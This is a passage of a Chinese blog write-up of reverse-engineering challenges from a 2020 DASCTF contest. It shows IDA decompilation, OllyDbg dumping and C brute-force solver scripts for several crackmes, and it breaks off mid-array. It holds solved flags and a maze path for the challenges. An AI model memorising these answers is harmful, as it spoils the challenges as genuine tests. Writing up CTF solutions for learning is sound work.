class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">49</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span>,  <span class="number">79</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, ida_chars[<span class="number">10</span>*i+j]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626142225682.png" alt="image-20200626142225682"></p></li><li><p>由于0和O不易区别，自己把0换成了1。最后从1绕过O走到#即可。<strong>jkkjjhjjkjjkkkuukukkuuhhhuukkkk</strong> 再mad5加密一下。</p></li></ul><h3 id="Magia"><a href="#Magia" class="headerlink" title="Magia"></a>Magia</h3><p>没看见题目的提示，在找密码的时候所有情况试的。。。</p><ul><li><p>32位PE文件，首先打开看了下， 提示输入一个密码，然后验证。ida中看看。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626205847063.png" alt="image-20200626205847063"></p></li><li><p>接着看下面：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626210117361.png" alt="image-20200626210117361"></p></li><li><p>用限制条件写爆破试试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, v5 = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v11[] = &#123;<span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v43[] = &#123;<span class="number">76</span>, <span class="number">101</span>, <span class="number">96</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">97</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> v59[] = &#123;<span class="number">51</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">31</span>; i &gt; v5; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">33</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j &amp; <span class="number">0xf</span>) == v11[i])</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">33</span>; k &lt; <span class="number">127</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((k &amp; <span class="number">0xf</span>) == v11[v5])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((k^j) == v59[v5] &amp;&amp; (k&amp;j) == v43[v5])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j, flag[v5] = k;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">v5++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626210315055.png" alt="image-20200626210315055"></p></li><li><p>可以看到，情况是不唯一的，不然开始就会是Nep了。先接着往下看看：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626211038037.png" alt="image-20200626211038037"></p></li><li><p>开始找重写的sub_403000()函数。先得到key[14]的所有情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v11[] = &#123;<span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">13</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> v43[] = &#123;<span class="number">76</span>, <span class="number">101</span>, <span class="number">96</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">97</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> v59[] = &#123;<span class="number">51</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">12</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">32</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i&amp;<span class="number">0xf</span>) == v11[<span class="number">14</span>])</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j&amp;<span class="number">0xf</span>) == v11[<span class="number">31</span><span class="number">-14</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((i^j) == v59[<span class="number">14</span>]) &amp;&amp; ((i&amp;j) == v43[<span class="number">14</span>]))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c "</span>, i, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626211709542.png" alt="image-20200626211709542"></p></li><li><p>因为是成对的，将之前的得到的不唯一的key，指定位置换成这3对字符。然后载入OD，依次试一下，发现当Ox与oX都会报错，而_h正常执行。得到此时的程序状态后dump出来。</p></li><li><p>将dump出的文件，载入ida看一下重写的函数的功能。</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626212512352.png" alt="image-20200626212512352"></p></li><li><p>因为没看题目提示，使用之前找key[14]的办法，所有情况解出后看key怎么顺眼。最后得到：<strong>Nep{mircle_and_maho_is_not_free}</strong></p></li><li><p>其实题目给了格式的提示。。。</p></li><li><p>再记录下ida中v35[i] = ……语句的地址，进入OD中下断点，然后输入正确的key，得到最终flag:</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626212858460.png" alt="image-20200626212858460"></p></li></ul><h3 id="521"><a href="#521" class="headerlink" title="521"></a>521</h3><ul><li><p>64位elf文件，运行看一下，直接让输入flag然后验证。</p></li><li><p>还是载入ida：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626213538336.png" alt="image-20200626213538336"></p></li><li><p>进入v4 = sub_55FE07F79864(a4, (__int64)&amp;v8)：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626213804986.png" alt="image-20200626213804986"></p></li><li><p>接着看下面：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214036174.png" alt="image-20200626214036174"></p></li><li><p>上面标黄的是整个题的关键函数，进入：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200626214524044.png" alt="image-20200626214524044"></p></li><li><p>ida动调提取出数据表：</p><p><img src="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/102BQ%60SD09NF5_648M8$WH.png" alt="img"></p></li><li><p>最后exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">128</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">89</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">53</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">115</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">141</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">81</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">93</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">48</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">232</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">87</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">38</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">246</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">    <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">198</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">146</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">94</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">220</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">131</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">118</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">146</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">101</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">251</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">46</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">77</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">107</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">69</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">135</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">255</span>, <span class="number">255</span>, <span class="number">233</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,  <span class="number">34</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x32</span>, <span class="number">0x4A</span>, <span class="number">0x3B</span>, <span class="number">0x30</span>, <span class="number">0xA5</span>, <span class="number">0x7F</span>, <span class="number">0xF0</span>, <span class="number">0xC4</span>, <span class="number">0x48</span>, </span><br><span class="line">  <span class="number">0xE5</span>, <span class="number">0x52</span>, <span class="number">0xC7</span>, <span class="number">0x53</span>, <span class="number">0xC0</span>, <span class="number">0x2D</span>, <span class="number">0xBE</span>, <span class="number">0xEC</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, </span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0x2E</span>, <span class="number">0xB5</span>, <span class="number">0x44</span>, <span class="number">0x15</span>, <span class="number">0x57</span>, <span class="number">0xDC</span>, <span class="number">0x9F</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x42</span>, <span class="number">0xFF</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0xA6</span>, <span class="number">0x33</span>, <span class="number">0x5F</span>, <span class="number">0x5C</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x4C</span>, <span class="number">0xA8</span>, <span class="number">0xFE</span>, <span class="number">0x1C</span>, <span class="number">0x7E</span>, <span class="number">0x24</span>, <span class="number">0x6C</span>, <span class="number">0x6A</span>, <span class="number">0x9C</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0xA1</span>, <span class="number">0x50</span>, <span class="number">0xC5</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0x26</span>, <span class="number">0x16</span>, <span class="number">0x55</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0xCD</span>, <span class="number">0xAA</span>, <span class="number">0x8A</span>, <span class="number">0xD1</span>, <span class="number">0x74</span>, <span class="number">0x77</span>, <span class="number">0xD8</span>, <span class="number">0x68</span>, <span class="number">0xFC</span>, </span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0xCC</span>, <span class="number">0xE7</span>, <span class="number">0x88</span>, <span class="number">0xB7</span>, <span class="number">0xE6</span>, <span class="number">0x3E</span>, <span class="number">0x70</span>, <span class="number">0x86</span>, <span class="number">0x9E</span>, </span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x56</span>, <span class="number">0xCA</span>, <span class="number">0x95</span>, <span class="number">0xB2</span>, <span class="number">0x51</span>, <span class="number">0xAF</span>, <span class="number">0xD3</span>, </span><br><span class="line">  <span class="number">0x6B</span>, <span class="number">0x28</span>, <span class="number">0x8B</span>, <span class="number">0xEE</span>, <span class="number">0xBC</span>, <span class="number">0x9B</span>, <span class="number">0x85</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x84</span>, <span class="number">0xBF</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0xBA</span>, <span class="number">0x46</span>, <span class="number">0xB8</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x3D</span>, <span class="number">0xB0</span>, <span class="number">0x7A</span>, <span class="number">0xEB</span>, <span class="number">0x38</span>, <span class="number">0x5A</span>, <span class="number">0x41</span>, <span class="number">0x8D</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x81</span>, <span class="number">0x79</span>, <span class="number">0x12</span>, <span class="number">0x40</span>, <span class="number">0x1B</span>, <span class="number">0xF8</span>, <span class="number">0xED</span>, <span class="number">0x82</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0xE3</span>, <span class="number">0x10</span>, <span class="number">0xB4</span>, <span class="number">0x39</span>, <span class="number">0x3C</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0xBD</span>, <span class="number">0xF4</span>, <span class="number">0x5D</span>, <span class="number">0x91</span>, <span class="number">0x1F</span>, </span><br><span class="line">  <span class="number">0x7C</span>, <span class="number">0x8C</span>, <span class="number">0x66</span>, <span class="number">0xCE</span>, <span class="number">0x7B</span>, <span class="number">0x99</span>, <span class="number">0xC3</span>, <span class="number">0xD6</span>, <span class="number">0x29</span>, <span class="number">0xA2</span>, </span><br><span class="line">  <span class="number">0xAB</span>, <span class="number">0xC9</span>, <span class="number">0x4E</span>, <span class="number">0xCF</span>, <span class="number">0xDB</span>, <span class="number">0xF6</span>, <span class="number">0xA3</span>, <span class="number">0x03</span>, <span class="number">0xB9</span>, <span class="number">0xA7</span>, </span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0x69</span>, <span 